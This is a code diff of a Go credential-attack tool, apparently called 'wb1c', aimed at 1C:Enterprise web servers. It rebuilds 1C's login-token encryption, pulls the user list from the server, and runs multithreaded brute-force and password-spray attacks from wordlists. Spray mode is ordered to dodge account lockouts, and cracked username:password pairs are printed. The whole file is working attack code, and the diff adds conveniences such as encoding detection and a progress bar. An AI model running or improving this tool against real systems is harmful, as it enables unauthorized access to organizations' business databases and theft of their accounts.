@@ -26,6 +26,7 @@ import (
 	"sync"
 	"sync/atomic"
 	"syscall"
+	"time"
 	"unicode"
 )
 
@@ -48,167 +49,120 @@ var httpClient = &http.Client{
 }
 
 // pad выполняет PKCS#7 padding.
-func pad(src []byte, blockSize int) []byte {
-	padding := blockSize - len(src)%blockSize
-	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
-	return append(src, padtext...)
+func pad(data []byte, blockSize int) []byte {
+	padding := blockSize - len(data)%blockSize
+	padText := bytes.Repeat([]byte{byte(padding)}, padding)
+	return append(data, padText...)
 }
 
-// encryptAESCBC шифрует данные в режиме AES-CBC с PKCS#7 padding.
-func encryptAESCBC(key, plaintext, iv []byte) ([]byte, error) {
-	block, err := aes.NewCipher(key)
-	if err != nil {
-		return nil, err
-	}
-	plaintext = pad(plaintext, block.BlockSize())
-	ciphertext := make([]byte, len(plaintext))
-	mode := cipher.NewCBCEncrypter(block, iv)
-	mode.CryptBlocks(ciphertext, plaintext)
-	return ciphertext, nil
-}
-
-// sha1Base64 вычисляет SHA1-хеш строки и возвращает его base64-кодировку.
-func sha1Base64(s string) string {
-	h := sha1.Sum([]byte(s))
-	return base64.StdEncoding.EncodeToString(h[:])
-}
-
-// generateAuthToken генерирует токен аутентификации по алгоритму 1С.
+// generateAuthToken создаёт токен аутентификации 1С.
 func generateAuthToken(password, username string) (string, error) {
-	var tokenBytes bytes.Buffer
+	token := []byte{0x01}
 
-	// Версия токена: 1
-	tokenBytes.WriteByte(1)
-
-	// Первый блок шифрования
 	randomBlock1 := make([]byte, 32)
 	if _, err := rand.Read(randomBlock1); err != nil {
 		return "", err
 	}
-	key1Data := []byte(sha1Base64(password))
-	key1 := sha256.Sum256(key1Data)
-	encryptedBlock1, err := encryptAESCBC(key1[:], randomBlock1, FIXED_IV)
+	h1 := sha1.Sum([]byte(password))
+	key1 := sha256.Sum256([]byte(base64.StdEncoding.EncodeToString(h1[:])))
+	block1, err := aes.NewCipher(key1[:])
 	if err != nil {
 		return "", err
 	}
-	tokenBytes.WriteByte(byte(len(encryptedBlock1)))
-	tokenBytes.Write(encryptedBlock1)
+	enc1 := make([]byte, len(pad(randomBlock1, aes.BlockSize)))
+	cipher.NewCBCEncrypter(block1, FIXED_IV).CryptBlocks(enc1, pad(randomBlock1, aes.BlockSize))
+	token = append(token, byte(len(enc1)))
+	token = append(token, enc1...)
 
-	// Второй блок шифрования с password в верхнем регистре
 	randomBlock2 := make([]byte, 32)
 	if _, err := rand.Read(randomBlock2); err != nil {
 		return "", err
 	}
-	key2Data := []byte(sha1Base64(strings.ToUpper(password)))
-	key2 := sha256.Sum256(key2Data)
-	encryptedBlock2, err := encryptAESCBC(key2[:], randomBlock2, FIXED_IV)
+	h2 := sha1.Sum([]byte(strings.ToUpper(password)))
+	key2 := sha256.Sum256([]byte(base64.StdEncoding.EncodeToString(h2[:])))
+	block2, err := aes.NewCipher(key2[:])
 	if err != nil {
 		return "", err
 	}
-	tokenBytes.WriteByte(byte(len(encryptedBlock2)))
-	tokenBytes.Write(encryptedBlock2)
+	enc2 := make([]byte, len(pad(randomBlock2, aes.BlockSize)))
+	cipher.NewCBCEncrypter(block2, FIXED_IV).CryptBlocks(enc2, pad(randomBlock2, aes.BlockSize))
+	token = append(token, byte(len(enc2)))
+	token = append(token, enc2...)
 
-	// Добавление имени пользователя: 4 байта длины (little-endian) + имя
 	usernameBytes := []byte(username)
 	lenBuf := make([]byte, 4)
 	binary.LittleEndian.PutUint32(lenBuf, uint32(len(usernameBytes)))
-	tokenBytes.Write(lenBuf)
-	tokenBytes.Write(usernameBytes)
+	token = append(token, lenBuf...)
+	token = append(token, usernameBytes...)
 
-	// Вычисление CRC32 для всех ранее записанных байт и добавление (4 байта, little-endian)
-	crc := crc32.ChecksumIEEE(tokenBytes.Bytes())
-	crcBuf := make([]byte, 4)
-	binary.LittleEndian.PutUint32(crcBuf, crc)
-	tokenBytes.Write(crcBuf)
+	checksum := crc32.ChecksumIEEE(token)
+	binary.LittleEndian.PutUint32(lenBuf, checksum)
+	token = append(token, lenBuf...)
 
-	return base64.StdEncoding.EncodeToString(tokenBytes.Bytes()), nil
+	return base64.StdEncoding.EncodeToString(token), nil
 }
 
-// getVersion делает GET-запрос к URL и извлекает версию по регулярному выражению.
+// getVersion получает версию информационной базы.
 func getVersion(baseURL string) (string, error) {
 	resp, err := httpClient.Get(baseURL + "/")
 	if err != nil {
 		return "", err
 	}
 	defer resp.Body.Close()
-	bodyBytes, err := io.ReadAll(resp.Body)
+	body, err := io.ReadAll(resp.Body)
 	if err != nil {
 		return "", err
 	}
-	re := regexp.MustCompile(`var VERSION = "([0-9\.]+)"`)
-	matches := re.FindStringSubmatch(string(bodyBytes))
-	if len(matches) >= 2 {
-		return matches[1], nil
+	re := regexp.MustCompile(`var VERSION = "([0-9.]+)"`)
+	if m := re.FindSubmatch(body); len(m) >= 2 {
+		return string(m[1]), nil
 	}
-	return "", fmt.Errorf("не удалось извлечь версию")
+	return "", fmt.Errorf("версия не найдена в ответе сервера")
 }
 
-// authenticate посылает POST-запрос с JSON-данными для аутентификации.
+// authenticate отправляет токен на сервер и возвращает результат.
 func authenticate(baseURL, version, credentials string) (bool, error) {
-	postURL := fmt.Sprintf("%s/e1cib/login?version=%s", baseURL, version)
-	payload := map[string]string{
-		"cred": credentials,
-	}
-	jsonData, err := json.Marshal(payload)
-	if err != nil {
-		return false, err
-	}
-	req, err := http.NewRequest("POST", postURL, bytes.NewReader(jsonData))
-	if err != nil {
-		return false, err
-	}
-	req.Header.Set("Content-Type", "application/json")
-	resp, err := httpClient.Do(req)
+	data, _ := json.Marshal(map[string]string{"cred": credentials})
+	resp, err := httpClient.Post(
+		fmt.Sprintf("%s/e1cib/login?version=%s", baseURL, version),
+		"application/json",
+		bytes.NewReader(data),
+	)
 	if err != nil {
 		return false, err
 	}
 	defer resp.Body.Close()
-	return resp.StatusCode == http.StatusOK, nil
+	return resp.StatusCode == 200, nil
 }
 
-// fetchUsers получает список пользователей с сервера.
+// fetchUsers получает список пользователей информационной базы.
 func fetchUsers(baseURL string) ([]string, error) {
 	resp, err := httpClient.Get(baseURL + "/e1cib/users")
 	if err != nil {
 		return nil, err
 	}
 	defer resp.Body.Close()
-	if resp.StatusCode != http.StatusOK {
-		return nil, fmt.Errorf("сервер вернул статус %d", resp.StatusCode)
-	}
-	bodyBytes, err := io.ReadAll(resp.Body)
+	body, err := io.ReadAll(resp.Body)
 	if err != nil {
 		return nil, err
 	}
-	// Сервер может использовать \r\n или \n
-	body := strings.ReplaceAll(string(bodyBytes), "\r\n", "\n")
-	var trimmed []string
-	for _, u := range strings.Split(body, "\n") {
-		// Убираем все управляющие и невидимые символы (включая zero-width spaces)
-		u = strings.Map(func(r rune) rune {
-			if unicode.IsControl(r) || !unicode.IsPrint(r) {
-				return -1
-			}
-			return r
-		}, u)
-		u = strings.TrimSpace(u)
-		if u != "" {
-			trimmed = append(trimmed, u)
+	var users []string
+	for _, u := range strings.Split(string(body), "\r\n") {
+		if u = strings.TrimSpace(u); u != "" {
+			users = append(users, u)
 		}
 	}
-	return trimmed, nil
+	return users, nil
 }
 
 // checkCredentials генерирует токен и проверяет учетные данные.
 func checkCredentials(baseURL, version, username, password string) bool {
 	token, err := generateAuthToken(password, username)
 	if err != nil {
-		log.Printf("Ошибка генерации токена для %s: %v", username, err)
 		return false
 	}
 	ok, err := authenticate(baseURL, version, token)
 	if err != nil {
-		log.Printf("Ошибка аутентификации для %s: %v", username, err)
 		return false
 	}
 	return ok
@@ -238,7 +192,26 @@ func decodeUTF16BE(b []byte) string {
 	return string(runes)
 }
 
-// decodeTextBytes определяет кодировку по BOM и возвращает текст в UTF-8.
+// looksLikeUTF16LE проверяет, похож ли файл на UTF-16 LE без BOM.
+// В UTF-16 LE нечётные байты (старший байт пары) для кириллицы = 0x04, для ASCII = 0x00.
+func looksLikeUTF16LE(data []byte) bool {
+	if len(data) < 8 || len(data)%2 != 0 {
+		return false
+	}
+	check := len(data)
+	if check > 200 {
+		check = 200
+	}
+	matches := 0
+	for i := 1; i < check; i += 2 {
+		if data[i] == 0x00 || data[i] == 0x04 {
+			matches++
+		}
+	}
+	return matches*2 > check
+}
+
+// decodeTextBytes определяет кодировку по BOM (или эвристике) и возвращает текст в UTF-8.
 func decodeTextBytes(data []byte) string {
 	switch {
 	case bytes.HasPrefix(data, []byte{0xEF, 0xBB, 0xBF}):
@@ -248,6 +221,9 @@ func decodeTextBytes(data []byte) string {
 	case bytes.HasPrefix(data, []byte{0xFE, 0xFF}):
 		return decodeUTF16BE(data[2:]) // UTF-16 BE
 	default:
+		if looksLikeUTF16LE(data) {
+			return decodeUTF16LE(data) // UTF-16 LE без BOM
+		}
 		return string(data)
 	}
 }
@@ -281,21 +257,28 @@ func loadLinesFromFile(filename string) ([]string, error) {
 	return parseLines(decodeTextBytes(data)), nil
 }
 
-// countPasswordFileLines считает непустые строки в файле не загружая его в память (UTF-8/UTF-8 BOM).
-// Для UTF-16 файлов делает полную загрузку (они обычно небольшие).
-func countPasswordFileLines(filename string) int {
+// countFileLines считает строки используя ту же логику что loadLinesFromFile.
+// Для UTF-8 без BOM использует стриминг (экономия памяти для больших файлов паролей).
+func countFileLines(filename string) int {
 	f, err := os.Open(filename)
 	if err != nil {
+		log.Printf("Не удалось открыть файл %s: %v", filename, err)
 		return 0
 	}
-	bom := make([]byte, 3)
-	n, _ := f.Read(bom)
-	f.Close()
-	bom = bom[:n]
+	defer f.Close()
 
-	isUTF16 := (n >= 2 && bom[0] == 0xFF && bom[1] == 0xFE) ||
-		(n >= 2 && bom[0] == 0xFE && bom[1] == 0xFF)
-	if isUTF16 {
+	// Читаем начало для определения кодировки
+	header := make([]byte, 200)
+	n, _ := f.Read(header)
+	header = header[:n]
+
+	// Любая специальная кодировка — грузим полностью через loadLinesFromFile
+	needsFull := bytes.HasPrefix(header, []byte{0xEF, 0xBB, 0xBF}) ||
+		bytes.HasPrefix(header, []byte{0xFF, 0xFE}) ||
+		bytes.HasPrefix(header, []byte{0xFE, 0xFF}) ||
+		looksLikeUTF16LE(header)
+	if needsFull {
+		f.Close()
 		lines, err := loadLinesFromFile(filename)
 		if err != nil {
 			return 0
@@ -303,18 +286,20 @@ func countPasswordFileLines(filename string) int {
 		return len(lines)
 	}
 
-	f2, err := os.Open(filename)
-	if err != nil {
+	// UTF-8 plain: стримим с той же фильтрацией что parseLines
+	if _, err := f.Seek(0, io.SeekStart); err != nil {
 		return 0
 	}
-	defer f2.Close()
-	if n >= 3 && bom[0] == 0xEF && bom[1] == 0xBB && bom[2] == 0xBF {
-		f2.Seek(3, io.SeekStart)
-	}
-	scanner := bufio.NewScanner(f2)
+	scanner := bufio.NewScanner(f)
 	count := 0
 	for scanner.Scan() {
-		if strings.TrimSpace(scanner.Text()) != "" {
+		line := strings.Map(func(r rune) rune {
+			if unicode.IsControl(r) || !unicode.IsPrint(r) {
+				return -1
+			}
+			return r
+		}, scanner.Text())
+		if strings.TrimSpace(line) != "" {
 			count++
 		}
 	}
@@ -328,14 +313,18 @@ func feedPasswordsFromFile(filename string, users []string, jobs chan<- job) err
 	if err != nil {
 		return err
 	}
-	bom := make([]byte, 3)
-	n, _ := f.Read(bom)
-	f.Close()
-	bom = bom[:n]
+	defer f.Close()
 
-	isUTF16 := (n >= 2 && bom[0] == 0xFF && bom[1] == 0xFE) ||
-		(n >= 2 && bom[0] == 0xFE && bom[1] == 0xFF)
-	if isUTF16 {
+	header := make([]byte, 200)
+	n, _ := f.Read(header)
+	header = header[:n]
+
+	needsFull := bytes.HasPrefix(header, []byte{0xEF, 0xBB, 0xBF}) ||
+		bytes.HasPrefix(header, []byte{0xFF, 0xFE}) ||
+		bytes.HasPrefix(header, []byte{0xFE, 0xFF}) ||
+		looksLikeUTF16LE(header)
+	if needsFull {
+		f.Close()
 		lines, err := loadLinesFromFile(filename)
 		if err != nil {
 			return err
@@ -348,69 +337,22 @@ func feedPasswordsFromFile(filename string, users []string, jobs chan<- job) err
 		return nil
 	}
 
-	f2, err := os.Open(filename)
-	if err != nil {
+	if _, err := f.Seek(0, io.SeekStart); err != nil {
 		return err
 	}
-	defer f2.Close()
-	if n >= 3 && bom[0] == 0xEF && bom[1] == 0xBB && bom[2] == 0xBF {
-		f2.Seek(3, io.SeekStart)
-	}
-	scanner := bufio.NewScanner(f2)
+	scanner := bufio.NewScanner(f)
 	for scanner.Scan() {
-		password := strings.TrimSpace(scanner.Text())
+		password := strings.Map(func(r rune) rune {
+			if unicode.IsControl(r) || !unicode.IsPrint(r) {
+				return -1
+			}
+			return r
+		}, scanner.Text())
+		password = strings.TrimSpace(password)
 		if password == "" {
 			continue
 		}
 		for _, username := range users {
-			jobs <- job{username, password}
-		}
-	}
-	return scanner.Err()
-}
-
-// feedUsersFromFile читает файл пользователей построчно и отправляет задачи в канал.
-// Используется в спрей-режиме: пользователи — внешний цикл, пароли — в памяти.
-func feedUsersFromFile(filename string, passwords []string, jobs chan<- job) error {
-	f, err := os.Open(filename)
-	if err != nil {
-		return err
-	}
-	bom := make([]byte, 3)
-	n, _ := f.Read(bom)
-	f.Close()
-	bom = bom[:n]
-
-	isUTF16 := (n >= 2 && bom[0] == 0xFF && bom[1] == 0xFE) ||
-		(n >= 2 && bom[0] == 0xFE && bom[1] == 0xFF)
-	if isUTF16 {
-		lines, err := loadLinesFromFile(filename)
-		if err != nil {
-			return err
-		}
-		for _, username := range lines {
-			for _, password := range passwords {
-				jobs <- job{username, password}
-			}
-		}
-		return nil
-	}
-
-	f2, err := os.Open(filename)
-	if err != nil {
-		return err
-	}
-	defer f2.Close()
-	if n >= 3 && bom[0] == 0xEF && bom[1] == 0xBB && bom[2] == 0xBF {
-		f2.Seek(3, io.SeekStart)
-	}
-	scanner := bufio.NewScanner(f2)
-	for scanner.Scan() {
-		username := strings.TrimSpace(scanner.Text())
-		if username == "" {
-			continue
-		}
-		for _, password := range passwords {
 			jobs <- job{username, password}
 		}
 	}
@@ -430,15 +372,62 @@ func uniqueStrings(input []string) []string {
 	return result
 }
 
-// uniqueStringsSorted убирает дубликаты и сортирует строки (для пользователей, как в Python).
+// uniqueStringsSorted убирает дубликаты и сортирует строки.
 func uniqueStringsSorted(input []string) []string {
 	result := uniqueStrings(input)
 	sort.Strings(result)
 	return result
 }
 
+// makeProgressBar возвращает ASCII прогресс-бар.
+func makeProgressBar(done, total int64, width int) string {
+	if total == 0 {
+		return "[" + strings.Repeat("-", width) + "]"
+	}
+	filled := int(float64(done) / float64(total) * float64(width))
+	if filled > width {
+		filled = width
+	}
+	bar := strings.Repeat("=", filled)
+	if filled < width {
+		bar += ">"
+		bar += strings.Repeat(" ", width-filled-1)
+	}
+	return "[" + bar + "]"
+}
+
+// formatETA форматирует оставшееся время.
+func formatETA(d time.Duration) string {
+	d = d.Round(time.Second)
+	if d <= 0 {
+		return "0s"
+	}
+	h := int(d.Hours())
+	m := int(d.Minutes()) % 60
+	s := int(d.Seconds()) % 60
+	if h > 0 {
+		return fmt.Sprintf("%dh%02dm%02ds", h, m, s)
+	}
+	if m > 0 {
+		return fmt.Sprintf("%dm%02ds", m, s)
+	}
+	return fmt.Sprintf("%ds", s)
+}
+
 func main() {
-	// Определение флагов командной строки
+	// Извлекаем URL из аргументов ДО flag.Parse() — это позволяет флагам стоять в любом месте,
+	// до или после URL (Go's flag.Parse останавливается на первом non-flag аргументе).
+	var baseURL string
+	filtered := []string{os.Args[0]}
+	for _, arg := range os.Args[1:] {
+		if (strings.HasPrefix(arg, "http://") || strings.HasPrefix(arg, "https://")) && baseURL == "" {
+			baseURL = arg
+		} else {
+			filtered = append(filtered, arg)
+		}
+	}
+	os.Args = filtered
+
 	userFlag := flag.String("u", "", "Имя пользователя для проверки пароля")
 	usersFileFlag := flag.String("U", "", "Файл со списком пользователей")
 	passwordFlag := flag.String("p", "", "Пароль для перебора")
@@ -448,7 +437,6 @@ func main() {
 	verboseFlag := flag.Bool("v", false, "Выводить все попытки, включая неудачные")
 	threadsFlag := flag.Int("t", 1, "Количество параллельных потоков")
 	outputFlag := flag.String("o", "", "Файл для сохранения результатов")
-
 	flag.Parse()
 	flag.Visit(func(f *flag.Flag) {
 		if f.Name == "p" {
@@ -456,23 +444,23 @@ func main() {
 		}
 	})
 
-	// Получаем URL из позиционного аргумента
-	args := flag.Args()
-	if len(args) < 1 {
-		log.Fatal("URL не указан! Использование: 1c_bruter [-u USER] [-U FILE] [-p PASSWORD] [-P FILE] [-l] [-o OUTPUT] URL")
+	// Если URL не нашли в args (не начинается с http), проверяем остаток от flag.Parse
+	if baseURL == "" {
+		if args := flag.Args(); len(args) > 0 {
+			baseURL = args[0]
+		}
 	}
-	baseURL := args[0]
-
+	if baseURL == "" {
+		log.Fatal("URL не указан!\nИспользование: wb1c [флаги] <URL>\n  Флаги можно указывать до или после URL.")
+	}
 	if !strings.HasPrefix(baseURL, "http") {
-		log.Fatalf("%s не является корректным URL!", baseURL)
+		log.Fatalf("Некорректный URL: %s", baseURL)
 	}
 
-	// Получаем версию информационной базы
 	version, err := getVersion(baseURL)
 	if err != nil || version == "" {
 		log.Fatalf("Не удалось определить версию! URL: %s, ошибка: %v", baseURL, err)
 	}
-	log.Printf("Версия: %s", version)
 
 	// Режим только получения списка пользователей
 	if *getUsersFlag && *userFlag == "" && *usersFileFlag == "" && !passwordFlagSet && *passwordsFileFlag == "" {
@@ -488,51 +476,26 @@ func main() {
 			fmt.Println(user)
 		}
 		if *outputFlag != "" {
-			err := os.WriteFile(*outputFlag, []byte(strings.Join(users, "\n")), 0644)
-			if err != nil {
+			if err := os.WriteFile(*outputFlag, []byte(strings.Join(users, "\n")), 0644); err != nil {
 				log.Printf("Ошибка сохранения: %v", err)
 			} else {
-				log.Printf("Список пользователей сохранён в %s", *outputFlag)
+				log.Printf("Список сохранён в %s", *outputFlag)
 			}
 		}
 		os.Exit(0)
 	}
 
-	// Подсчёт файлов для выбора режима (без загрузки в память)
-	usersFileCount := 0
-	if *usersFileFlag != "" {
-		usersFileCount = countPasswordFileLines(*usersFileFlag)
-		if usersFileCount == 0 {
-			log.Printf("Предупреждение: файл с пользователями пустой или недоступен: %s", *usersFileFlag)
-		}
-	}
-
-	var inlinePws []string
-	if passwordFlagSet {
-		inlinePws = []string{*passwordFlag}
-	}
-	pwCount := len(inlinePws)
-	if *passwordsFileFlag != "" {
-		if n := countPasswordFileLines(*passwordsFileFlag); n > 0 {
-			pwCount += n
-		} else {
-			log.Printf("Предупреждение: файл с паролями пустой или недоступен: %s", *passwordsFileFlag)
-		}
-	}
-
-	// Спрей-режим: файл пользователей > файл паролей → стримим пользователей, пароли в памяти.
-	// Брут-режим: иначе → стримим пароли, пользователей в памяти.
-	sprayMode := *usersFileFlag != "" && usersFileCount > pwCount
-
-	// Загружаем пользователей (в брут-режиме грузим файл; в спрей-режиме только -u и -l)
+	// Загружаем пользователей
 	var users []string
 	if *userFlag != "" {
 		users = append(users, *userFlag)
 	}
-	if !sprayMode && *usersFileFlag != "" {
+	if *usersFileFlag != "" {
 		lines, err := loadLinesFromFile(*usersFileFlag)
 		if err != nil {
-			log.Printf("Ошибка чтения файла с пользователями: %v", err)
+			log.Printf("Ошибка чтения файла с пользователями (%s): %v", *usersFileFlag, err)
+		} else if len(lines) == 0 {
+			log.Printf("Предупреждение: файл пользователей пустой или кодировка не распознана: %s", *usersFileFlag)
 		} else {
 			users = append(users, lines...)
 		}
@@ -540,72 +503,123 @@ func main() {
 	if *getUsersFlag {
 		fetched, err := fetchUsers(baseURL)
 		if err != nil {
-			log.Printf("Ошибка получения пользователей: %v", err)
+			log.Printf("Ошибка получения пользователей с сервера: %v", err)
 		} else {
 			users = append(users, fetched...)
 		}
 	}
 	users = uniqueStringsSorted(users)
-
-	totalUsers := int64(len(users))
-	if sprayMode {
-		totalUsers += int64(usersFileCount)
-	}
-	if totalUsers == 0 {
+	if len(users) == 0 {
 		log.Fatal("Пользователи не загружены!")
 	}
 
-	// В спрей-режиме загружаем пароли в память (их мало — это суть спрея)
+	// Подсчёт паролей
+	var inlinePws []string
+	if passwordFlagSet {
+		inlinePws = []string{*passwordFlag}
+	}
+	pwFileCount := 0
+	if *passwordsFileFlag != "" {
+		pwFileCount = countFileLines(*passwordsFileFlag)
+		if pwFileCount == 0 {
+			log.Printf("Предупреждение: файл паролей пустой или недоступен: %s", *passwordsFileFlag)
+		}
+	}
+	pwTotal := len(inlinePws) + pwFileCount
+	if pwTotal == 0 {
+		log.Fatal("Пароли не загружены!")
+	}
+
+	// Спрей-режим: много пользователей, мало паролей — перебираем один пароль по всем.
+	// Порядок: for password → for user (защита от блокировок аккаунтов).
+	// Брут-режим: несколько пользователей, много паролей — перебираем все пароли на каждого.
+	sprayMode := len(users) > pwTotal
+
 	var sprayPws []string
 	if sprayMode {
 		sprayPws = append(sprayPws, inlinePws...)
 		if *passwordsFileFlag != "" {
 			lines, err := loadLinesFromFile(*passwordsFileFlag)
 			if err != nil {
-				log.Printf("Ошибка чтения файла с паролями: %v", err)
+				log.Printf("Ошибка чтения файла паролей: %v", err)
 			} else {
 				sprayPws = append(sprayPws, lines...)
 			}
 		}
 		sprayPws = uniqueStrings(sprayPws)
+		pwTotal = len(sprayPws)
 	}
 
-	if pwCount == 0 {
-		log.Fatal("Пароли не загружены!")
-	}
-
-	// Обработка Ctrl+C
+	// Ctrl+C
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
 	go func() {
 		<-sigChan
-		log.Println("Прервано пользователем.")
+		fmt.Fprintln(os.Stderr, "\nПрервано.")
 		os.Exit(0)
 	}()
 
-	// Сводка перед перебором
-	total := totalUsers * int64(pwCount)
-	log.Printf("Пользователей: %d, паролей: %d, всего попыток: %d", totalUsers, pwCount, total)
-	if sprayMode {
-		log.Printf("Режим: спрей (стриминг пользователей из файла)")
-	} else if *passwordsFileFlag != "" {
-		log.Printf("Режим: брут (стриминг паролей из файла)")
-	}
-	if *verboseFlag && len(users) > 0 {
-		log.Printf("Пользователи (в памяти): %q", users)
-	}
-
+	total := int64(len(users)) * int64(pwTotal)
 	workers := *threadsFlag
 	if workers < 1 {
 		workers = 1
 	}
-	log.Printf("Потоков: %d", workers)
+
+	// Шапка
+	fmt.Fprintln(os.Stderr)
+	fmt.Fprintf(os.Stderr, "  Цель:    %s  (v%s)\n", baseURL, version)
+	if sprayMode {
+		fmt.Fprintf(os.Stderr, "  Режим:   спрей  |  пользователей: %d  |  паролей: %d  |  попыток: %d\n",
+			len(users), pwTotal, total)
+	} else {
+		fmt.Fprintf(os.Stderr, "  Режим:   брут   |  пользователей: %d  |  паролей: %d  |  попыток: %d\n",
+			len(users), pwTotal, total)
+	}
+	fmt.Fprintf(os.Stderr, "  Потоков: %d\n\n", workers)
 
 	jobs := make(chan job, workers*4)
 	var wg sync.WaitGroup
 	var mu sync.Mutex
 	var tried int64
 	var results []string
+
+	start := time.Now()
+
+	// Прогресс-бар (отключается в verbose-режиме)
+	progressDone := make(chan struct{})
+	var progressWg sync.WaitGroup
+	if !*verboseFlag {
+		progressWg.Add(1)
+		go func() {
+			defer progressWg.Done()
+			ticker := time.NewTicker(200 * time.Millisecond)
+			defer ticker.Stop()
+			for {
+				select {
+				case <-ticker.C:
+					n := atomic.LoadInt64(&tried)
+					elapsed := time.Since(start).Seconds()
+					speed := 0.0
+					if elapsed > 0.5 {
+						speed = float64(n) / elapsed
+					}
+					eta := "?"
+					if speed > 0 && total > n {
+						eta = formatETA(time.Duration(float64(total-n) / speed * float64(time.Second)))
+					}
+					pct := float64(n) * 100 / float64(total)
+					bar := makeProgressBar(n, total, 30)
+					line := fmt.Sprintf("  %s  %d/%d  %.1f%%  %.0f/s  ETA %s",
+						bar, n, total, pct, speed, eta)
+					mu.Lock()
+					fmt.Fprintf(os.Stderr, "\r%-80s", line)
+					mu.Unlock()
+				case <-progressDone:
+					return
+				}
+			}
+		}()
+	}
 
 	for i := 0; i < workers; i++ {
 		wg.Add(1)
@@ -614,56 +628,56 @@ func main() {
 			for j := range jobs {
 				n := atomic.AddInt64(&tried, 1)
 				if *verboseFlag {
-					log.Printf("[%d/%d] Проверка: %s:%s", n, total, j.username, j.password)
+					log.Printf("[%d/%d] %s:%s", n, total, j.username, j.password)
 				}
 				if checkCredentials(baseURL, version, j.username, j.password) {
-					result := fmt.Sprintf("%s:%s", j.username, j.password)
 					mu.Lock()
-					results = append(results, result)
+					results = append(results, fmt.Sprintf("%s:%s", j.username, j.password))
+					if !*verboseFlag {
+						fmt.Fprintf(os.Stderr, "\r%-80s\r", "")
+					}
+					fmt.Printf("[+] %s : %s\n", j.username, j.password)
 					mu.Unlock()
-					log.Printf("[+] Успешная аутентификация! Пользователь: %s, Пароль: %s", j.username, j.password)
 				} else if *verboseFlag {
-					log.Printf("[-] Неудачно: %s:%s", j.username, j.password)
+					log.Printf("[-] %s:%s", j.username, j.password)
 				}
 			}
 		}()
 	}
 
 	if sprayMode {
-		// Спрей: стримим пользователей, пароли в памяти
-		for _, username := range users {
-			for _, password := range sprayPws {
-				jobs <- job{username, password}
-			}
-		}
-		if *usersFileFlag != "" {
-			if err := feedUsersFromFile(*usersFileFlag, sprayPws, jobs); err != nil {
-				log.Printf("Ошибка чтения файла с пользователями: %v", err)
+		// Спрей: for password → for user (один пароль на всех, потом следующий)
+		for _, pass := range sprayPws {
+			for _, user := range users {
+				jobs <- job{user, pass}
 			}
 		}
 	} else {
-		// Брут: стримим пароли, пользователи в памяти
-		for _, password := range inlinePws {
-			for _, username := range users {
-				jobs <- job{username, password}
+		// Брут: for user → for password, пароли стримятся из файла
+		for _, pass := range inlinePws {
+			for _, user := range users {
+				jobs <- job{user, pass}
 			}
 		}
 		if *passwordsFileFlag != "" {
 			if err := feedPasswordsFromFile(*passwordsFileFlag, users, jobs); err != nil {
-				log.Printf("Ошибка чтения файла с паролями: %v", err)
+				log.Printf("Ошибка чтения файла паролей: %v", err)
 			}
 		}
 	}
 	close(jobs)
 	wg.Wait()
 
-	log.Printf("Перебор завершён. Проверено: %d, найдено: %d", tried, len(results))
+	close(progressDone)
+	progressWg.Wait()
+	elapsed := time.Since(start).Round(time.Second)
+	fmt.Fprintf(os.Stderr, "\r%-80s\r\n", "")
+	fmt.Fprintf(os.Stderr, "  Завершено  |  проверено: %d  |  найдено: %d  |  время: %s\n\n",
+		tried, len(results), elapsed)
 
-	// Сохранение результатов в файл
 	if *outputFlag != "" && len(results) > 0 {
-		err := os.WriteFile(*outputFlag, []byte(strings.Join(results, "\n")), 0644)
-		if err != nil {
-			log.Printf("Ошибка сохранения результатов: %v", err)
+		if err := os.WriteFile(*outputFlag, []byte(strings.Join(results, "\n")), 0644); err != nil {
+			log.Printf("Ошибка сохранения: %v", err)
 		} else {
 			log.Printf("Результаты сохранены в %s", *outputFlag)
 		}
